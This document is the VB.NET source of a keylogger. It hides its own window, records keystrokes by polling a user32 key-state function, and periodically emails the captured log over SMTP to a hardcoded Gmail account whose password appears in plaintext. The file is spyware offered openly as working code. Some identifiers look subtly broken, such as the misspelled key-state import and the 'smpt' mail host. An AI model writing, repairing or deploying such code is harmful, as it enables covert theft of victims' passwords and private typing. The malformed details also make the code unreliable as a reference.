Option Strict On
Imports System.Net.Mail
Public Class Form1
    Private Declare Function GetAsncKeyState Lib "user32" (ByVal vkey As Long) As Integer
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles TmrEmail.Tick
        Try
            Dim SMPTServer As New SmtpClient
            SMPTServer.EnableSsl = True
            Dim mail As New MailMessage
            SMPTServer.Credentials = New Net.NetworkCredential("djzevelmusic@gmail.com", "musicbyzevel")
            SMPTServer.Port = 587
            SMPTServer.Host = "smpt.gmail.com"
            mail = New MailMessage
            mail.From = New MailAddress("djzevelmusic@gmail.com")
            mail.To.Add("djzevelmusic@gmail.com")
            mail.Subject = ("new logs")
            mail.Body = textlogs.Text
            SMPTServer.Send(mail)
        Catch ex As Exception
            Me.Close()
        End Try
    End Sub

    Private Sub TmrKeys_Tick(sender As Object, e As EventArgs) Handles TmrKeys.Tick
        Dim result As Integer
        Dim key As String
        Dim i As Integer
        For i = 2 To 90
            result = 0
            result = GetAsncKeyState(i)
            If result = -32767 Then
                key = Chr(i)
                If i = 13 Then key = vbNewLine
                Exit For
            End If
        Next
        If key <> Nothing Then
            If My.Computer.Keyboard.ShiftKeyDown OrElse My.Computer.Keyboard.CapsLock Then
                textlogs.Text &= key
            Else
                textlogs.Text &= key.ToLower
            End If
        End If
        If My.Computer.Keyboard.AltKeyDown AndAlso My.Computer.Keyboard.CtrlKeyDown AndAlso key = "H" Then
            Me.Visible = True
        End If
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.ShowInTaskbar = False
        Me.ShowIcon = False
        Me.Visible = False
        textlogs.Text = "keylogger Started at " & Now & vbNewLine

    End Sub

    Private Sub Form1_Closed(sender As Object, e As EventArgs) Handles Me.Closed
        textlogs.Text &= "Keylogger stopped at :" & Now & vbNewLine
    End Sub
End Class
